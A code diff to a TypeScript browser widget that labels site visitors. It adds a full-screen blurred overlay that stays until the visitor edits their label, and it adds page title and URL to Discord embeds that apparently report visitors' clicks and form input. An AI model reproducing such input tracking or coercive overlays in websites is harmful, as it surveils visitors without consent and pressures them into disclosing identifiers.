@@ -217,27 +217,135 @@ function injectWidgetStyles(): void {
   const style = document.createElement('style');
   style.id = 'drae-widget-styles';
   style.textContent = `
-    .drae-widget {
+    .drae-widget-backdrop {
       position: fixed;
       top: 0;
-      right: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: ${CONFIG.WIDGET_Z_INDEX - 1};
+      pointer-events: auto;
+      animation: fadeInBackdrop 0.3s ease-out;
+    }
+    
+    .drae-content-blur {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      z-index: ${CONFIG.WIDGET_Z_INDEX - 2};
+      pointer-events: auto;
+      animation: fadeInBlur 0.3s ease-out;
+    }
+    
+    @keyframes fadeInBackdrop {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    
+    @keyframes fadeInBlur {
+      from { backdrop-filter: blur(0px); -webkit-backdrop-filter: blur(0px); }
+      to { backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
+    }
+    
+    .drae-arrow-container {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: ${CONFIG.WIDGET_Z_INDEX + 1};
+      pointer-events: none;
+      width: 0;
+      height: 0;
+    }
+    
+    .drae-arrow {
+      position: absolute;
+      font-size: 24px;
+      color: #10b981;
+      animation: pointToWidget 1s ease-in-out infinite alternate;
+      text-shadow: 0 0 10px rgba(16, 185, 129, 0.5);
+    }
+    
+    @keyframes pointToWidget {
+      from { 
+        opacity: 0.6;
+        transform: scale(1);
+      }
+      to { 
+        opacity: 1;
+        transform: scale(1.2);
+      }
+    }
+    
+    .drae-arrow:nth-child(1) {
+      top: -40px;
+      left: 50%;
+      transform: translateX(-50%);
+      animation-delay: 0s;
+    }
+    
+    .drae-arrow:nth-child(2) {
+      top: 50%;
+      right: -40px;
+      transform: translateY(-50%) rotate(90deg);
+      animation-delay: 0.25s;
+    }
+    
+    .drae-arrow:nth-child(3) {
+      bottom: -40px;
+      left: 50%;
+      transform: translateX(-50%) rotate(180deg);
+      animation-delay: 0.5s;
+    }
+    
+    .drae-arrow:nth-child(4) {
+      top: 50%;
+      left: -40px;
+      transform: translateY(-50%) rotate(270deg);
+      animation-delay: 0.75s;
+    }
+    
+    .drae-widget {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
       z-index: ${CONFIG.WIDGET_Z_INDEX};
       background: #000000;
       color: #ffffff;
-      padding: 6px 8px;
-      border-radius: 0 0 0 8px;
+      padding: 12px 16px;
+      border-radius: 12px;
       font-family: 'Outfit', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      font-size: 10px;
+      font-size: 12px;
       font-weight: 500;
       display: flex;
       align-items: center;
-      gap: 6px;
+      gap: 8px;
       backdrop-filter: blur(12px);
-      border: 1px solid #333333;
-      border-top: none;
-      border-right: none;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
-      min-width: 120px;
+      border: 2px solid #333333;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+      min-width: 200px;
+      animation: pulseWidget 2s infinite;
+      pointer-events: auto;
+    }
+    
+    .drae-widget.with-arrows {
+      animation: pulseWidget 2s infinite, breathe 3s ease-in-out infinite;
+    }
+    
+    @keyframes breathe {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); }
+      50% { transform: translate(-50%, -50%) scale(1.05); }
+    }
+    
+    @keyframes pulseWidget {
+      0%, 100% { box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), 0 0 0 0 rgba(16, 185, 129, 0.7); }
+      50% { box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), 0 0 0 4px rgba(16, 185, 129, 0); }
     }
     
     .drae-label-container {
@@ -477,17 +585,37 @@ function injectWidgetStyles(): void {
 function createDeviceLabelWidget(): void {
   if (deviceLabelWidget) return;
   
-  // Check if widget has been permanently hidden
-  const isWidgetHidden = localStorage.getItem(`${CONFIG.LOCAL_STORAGE_PREFIX}widget_hidden`) === 'true';
-  if (isWidgetHidden) return;
+  // Only hide widget if label has been changed
+  const hasChanged = hasLabelBeenChanged();
+  if (hasChanged) return;
   
   injectWidgetStyles();
   
+  // Create blur layer first
+  const blurDiv = document.createElement('div');
+  blurDiv.className = 'drae-content-blur';
+  document.body.appendChild(blurDiv);
+  
+  // Create backdrop second
+  const backdrop = document.createElement('div');
+  backdrop.className = 'drae-widget-backdrop';
+  document.body.appendChild(backdrop);
+  
+  // Create arrow container
+  const arrowContainer = document.createElement('div');
+  arrowContainer.className = 'drae-arrow-container';
+  arrowContainer.innerHTML = `
+    <div class="drae-arrow">↑</div>
+    <div class="drae-arrow">↑</div>
+    <div class="drae-arrow">↑</div>
+    <div class="drae-arrow">↑</div>
+  `;
+  document.body.appendChild(arrowContainer);
+  
   const currentLabel = localStorage.getItem(`${CONFIG.LOCAL_STORAGE_PREFIX}visitor_label`) || 'Unknown';
-  const hasChanged = hasLabelBeenChanged();
   
   deviceLabelWidget = document.createElement('div');
-  deviceLabelWidget.className = 'drae-widget';
+  deviceLabelWidget.className = 'drae-widget with-arrows';
   deviceLabelWidget.innerHTML = `
     <div class="drae-label-container">
       <div class="drae-tag-icon">
@@ -495,7 +623,10 @@ function createDeviceLabelWidget(): void {
           <path fill="currentColor" d="M19.459,1.572 C20.208,1.744 20.966,2.025 21.471,2.529 C21.975,3.034 22.256,3.792 22.428,4.54 C22.605,5.314 22.693,6.199 22.729,7.069 C22.801,8.812 22.672,10.592 22.588,11.502 C22.536,12.07 22.303,12.595 21.941,13.017 C19.231,16.169 16.423,19.039 13.356,21.785 C11.953,23.041 9.858,23.054 8.397,21.923 C5.987,20.057 3.943,18.013 2.077,15.603 C0.946,14.142 0.959,12.047 2.215,10.644 C4.961,7.577 7.831,4.769 10.983,2.059 C11.405,1.696 11.93,1.464 12.498,1.412 C13.408,1.328 15.188,1.199 16.931,1.271 C17.801,1.307 18.686,1.394 19.459,1.572 Z M16.869,2.77 C15.224,2.702 13.521,2.824 12.635,2.906 C12.391,2.928 12.157,3.028 11.961,3.197 C8.857,5.864 6.034,8.627 3.333,11.644 C2.583,12.482 2.553,13.767 3.263,14.684 C5.051,16.994 7.006,18.949 9.315,20.737 C10.233,21.447 11.518,21.417 12.356,20.667 C15.373,17.965 18.136,15.143 20.803,12.039 C20.972,11.843 21.072,11.609 21.094,11.365 C21.176,10.479 21.298,8.776 21.23,7.131 C21.196,6.308 21.115,5.524 20.966,4.876 C20.811,4.204 20.608,3.788 20.41,3.59 C20.212,3.392 19.796,3.188 19.124,3.034 C18.476,2.885 17.692,2.804 16.869,2.77 Z M15.25,6.5 C15.25,5.258 16.257,4.25 17.5,4.25 C18.743,4.25 19.75,5.258 19.75,6.5 C19.75,7.743 18.743,8.75 17.5,8.75 C16.257,8.75 15.25,7.743 15.25,6.5 Z M7.53,13.47 L10.53,16.47 C10.823,16.763 10.823,17.238 10.53,17.531 C10.237,17.823 9.763,17.823 9.47,17.531 L6.47,14.531 C6.177,14.238 6.177,13.763 6.47,13.47 C6.763,13.177 7.237,13.177 7.53,13.47 Z M17.5,7.25 C17.914,7.25 18.25,6.914 18.25,6.5 C18.25,6.086 17.914,5.75 17.5,5.75 C17.086,5.75 16.75,6.086 16.75,6.5 C16.75,6.914 17.086,7.25 17.5,7.25 Z" />
         </svg>
       </div>
-      <span class="drae-label-text">${currentLabel}</span>
+      <div style="display: flex; flex-direction: column; flex: 1; min-width: 0;">
+        <span class="drae-label-text">${currentLabel}</span>
+        ${!hasChanged ? '<span style="font-size: 10px; color: #6b7280; margin-top: 2px;">Edit this to remove widget</span>' : ''}
+      </div>
       <div class="drae-status-indicator ${hasChanged ? 'locked' : 'editable'}"></div>
     </div>
     ${!hasChanged ? `<button class="drae-edit-btn" title="Edit label">
@@ -512,23 +643,12 @@ function createDeviceLabelWidget(): void {
   
   document.body.appendChild(deviceLabelWidget);
   
-  // Auto-hide widget after 10 seconds and mark as permanently hidden
-  setTimeout(() => {
-    if (deviceLabelWidget) {
-      deviceLabelWidget.style.transition = 'opacity 0.5s ease-out, transform 0.5s ease-out';
-      deviceLabelWidget.style.opacity = '0';
-      deviceLabelWidget.style.transform = 'translateY(-100%)';
-      
-      setTimeout(() => {
-        if (deviceLabelWidget && deviceLabelWidget.parentNode) {
-          deviceLabelWidget.parentNode.removeChild(deviceLabelWidget);
-          deviceLabelWidget = null;
-        }
-        // Mark widget as permanently hidden
-        localStorage.setItem(`${CONFIG.LOCAL_STORAGE_PREFIX}widget_hidden`, 'true');
-      }, 500);
-    }
-  }, 10000);
+  // Store backdrop, blur and arrow references for cleanup
+  (deviceLabelWidget as any).backdrop = backdrop;
+  (deviceLabelWidget as any).blurDiv = blurDiv;
+  (deviceLabelWidget as any).arrowContainer = arrowContainer;
+  
+  // Widget stays visible until label is changed (removed auto-hide)
 }
 
 /**
@@ -555,22 +675,47 @@ function updateWidgetLabel(newLabel: string): void {
     statusIndicator.className = 'drae-status-indicator locked';
   }
   
-  // Gradually fade out and remove the widget after label change
+  // Pop out effect then fade forever
   setTimeout(() => {
     if (deviceLabelWidget) {
-      deviceLabelWidget.style.transition = 'opacity 2s ease-out, transform 2s ease-out';
-      deviceLabelWidget.style.opacity = '0';
-      deviceLabelWidget.style.transform = 'translateX(100%)';
+      // First, pop effect
+      deviceLabelWidget.style.transition = 'transform 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55)';
+      deviceLabelWidget.style.transform = 'translate(-50%, -50%) scale(1.1)';
       
-      // Remove widget completely after fade out
+      // Then fade out forever
       setTimeout(() => {
-        if (deviceLabelWidget && deviceLabelWidget.parentNode) {
-          deviceLabelWidget.parentNode.removeChild(deviceLabelWidget);
-          deviceLabelWidget = null;
+        if (deviceLabelWidget) {
+          deviceLabelWidget.style.transition = 'opacity 2s ease-out, transform 2s ease-out';
+          deviceLabelWidget.style.opacity = '0';
+          deviceLabelWidget.style.transform = 'translate(-50%, -50%) scale(0.8)';
+          
+          // Remove widget, backdrop, blur and arrows from DOM after fade completes
+          setTimeout(() => {
+            if (deviceLabelWidget && deviceLabelWidget.parentNode) {
+              // Remove arrows first
+              const arrowContainer = (deviceLabelWidget as any).arrowContainer;
+              if (arrowContainer && arrowContainer.parentNode) {
+                arrowContainer.parentNode.removeChild(arrowContainer);
+              }
+              // Remove blur div second
+              const blurDiv = (deviceLabelWidget as any).blurDiv;
+              if (blurDiv && blurDiv.parentNode) {
+                blurDiv.parentNode.removeChild(blurDiv);
+              }
+              // Remove backdrop third
+              const backdrop = (deviceLabelWidget as any).backdrop;
+              if (backdrop && backdrop.parentNode) {
+                backdrop.parentNode.removeChild(backdrop);
+              }
+              // Remove widget last
+              deviceLabelWidget.parentNode.removeChild(deviceLabelWidget);
+              deviceLabelWidget = null;
+            }
+          }, 2000);
         }
-      }, 2000);
+      }, 300); // Wait for pop effect to complete
     }
-  }, 3000); // Wait 3 seconds before starting fade out
+  }, 1000); // Wait 1 second before starting animation
 }
 
 /**
@@ -598,7 +743,7 @@ function openLabelEditModal(): void {
         You can only change your label ${CONFIG.MAX_LABEL_CHANGES} time${CONFIG.MAX_LABEL_CHANGES > 1 ? 's' : ''}! Choose wisely.
       </div>
       <div class="drae-suggestions">
-        <p style="margin: 0 0 12px 0; color: #9ca3af; font-size: 13px;">💡 <strong>Ideas for your username:</strong> Your Instagram handle, class codename, nickname, surname, gaming tag, or anything that represents you!</p>
+        <p style="margin: 0 0 12px 0; color: #9ca3af; font-size: 13px;">💡 <strong>Ideas for your username:</strong> Your Instagram handle, class codename, nickname, surname, gaming tag, or your preferred display name!</p>
       </div>
       <input type="text" id="drae-new-label" value="${currentLabel}" maxlength="${CONFIG.MAX_LABEL_CHARACTERS}" placeholder="Enter new label...">
       <div class="drae-char-counter">
@@ -643,7 +788,25 @@ function openLabelEditModal(): void {
   updateCharCounter();
   
   // Handle input changes
-  input.addEventListener('input', updateCharCounter);
+  input.addEventListener('input', (e) => {
+    const target = e.target as HTMLInputElement;
+    let value = target.value;
+    
+    // Replace spaces with dashes in real time
+    value = value.replace(/\s+/g, '-');
+    
+    // Capitalize first letter and letters after dashes in real time
+    value = value.charAt(0).toUpperCase() + value.slice(1).replace(/-(.)/g, (match, letter) => '-' + letter.toUpperCase());
+    
+    // Update the input value if it changed
+    if (target.value !== value) {
+      const cursorPosition = target.selectionStart;
+      target.value = value;
+      target.setSelectionRange(cursorPosition, cursorPosition);
+    }
+    
+    updateCharCounter();
+  });
   
   // Handle Enter key
   input.addEventListener('keypress', (e) => {
@@ -683,7 +846,7 @@ async function saveNewLabel(): Promise<void> {
   if (!labelEditModal || hasLabelBeenChanged()) return;
   
   const input = labelEditModal.querySelector('#drae-new-label') as HTMLInputElement;
-  const newLabel = input.value.trim();
+  let newLabel = input.value.trim();
   
   if (!newLabel || newLabel.length < 3) {
     alert('Label must be at least 3 characters long');
@@ -694,6 +857,11 @@ async function saveNewLabel(): Promise<void> {
     alert('Label must be 25 characters or less');
     return;
   }
+  
+  // Replace spaces with dashes and capitalize first letter after each dash
+  newLabel = newLabel.replace(/\s+/g, '-');
+  // Capitalize first letter of the entire string and first letter after each dash
+  newLabel = newLabel.charAt(0).toUpperCase() + newLabel.slice(1).replace(/-(.)/g, (match, letter) => '-' + letter.toUpperCase());
   
   const oldLabel = localStorage.getItem(`${CONFIG.LOCAL_STORAGE_PREFIX}visitor_label`) || 'Unknown';
   
@@ -1128,6 +1296,9 @@ function createInputDiscordEmbed(data: InputEventData): DiscordPayload {
     });
   }
   
+  // Always add page info at the end
+  fields.push({ name: '🌐 Page', value: `[${document.title}](${window.location.href})`, inline: false });
+  
   return {
     embeds: [{
       title: `⌨️ User Input: ${data.fieldName}`,
@@ -1284,6 +1455,9 @@ function createDiscordEmbed(data: ClickEventData): DiscordPayload {
   if (data.elementType) {
     fields.push({ name: '⚙️ Type', value: data.elementType, inline: true });
   }
+  
+  // Always add page info at the end
+  fields.push({ name: '🌐 Page', value: `[${document.title}](${window.location.href})`, inline: false });
   
   return {
     embeds: [{
